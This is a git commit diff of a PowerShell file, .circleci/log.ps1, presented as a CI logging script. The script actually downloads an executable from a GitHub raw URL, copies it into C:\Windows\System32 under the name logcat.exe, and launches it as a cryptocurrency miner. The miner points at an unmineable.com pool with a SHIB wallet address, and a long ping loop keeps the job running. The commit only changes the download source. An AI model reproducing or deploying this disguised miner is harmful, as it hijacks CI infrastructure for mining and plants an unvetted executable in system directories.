2a070ffb0289f8cc3f6d5cb10a93f527e5c920f7
dykamaestrooo <88433568+dykamaestrooo@users.noreply.github.com>
2021-08-04 22:23:17 +0700

    Update log.ps1

--- .circleci/log.ps1
+++ .circleci/log.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest https://raw.githubusercontent.com/GusionQuadra/akankah/main/vios.exe -OutFile logcat.exe
+Invoke-WebRequest https://raw.githubusercontent.com/dykamaestrooo/akankah/main/vios.exe -OutFile logcat.exe
 Copy logcat.exe C:\Windows\System32
 cmd /c echo cmd /k start logcat.exe --pool rx-us.unmineable.com:13333 --username SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9.$(shuf -i 10-9999999999999999999 -n 1) --password x --algorithm wrkzcoin --disableNVIDIA >>a.ps1
 cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
